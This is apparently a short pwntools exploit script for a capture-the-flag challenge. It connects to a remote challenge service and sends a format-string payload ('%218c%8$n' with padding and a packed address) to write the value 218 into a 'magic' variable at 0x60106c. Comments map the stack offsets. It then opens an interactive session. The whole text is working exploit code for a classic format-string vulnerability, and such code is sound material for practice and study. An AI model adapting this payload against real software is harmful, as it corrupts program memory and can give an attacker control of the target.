from pwn import *
magic = 0x60106c
r = remote('csie.ctf.tw', 10134)
# "%218c%8$": %6$
# "naaaaaaa": %7$
# "magic": %8$
r.sendline("%218c%8$naaaaaaa" + p64(magic))
r.interactive()

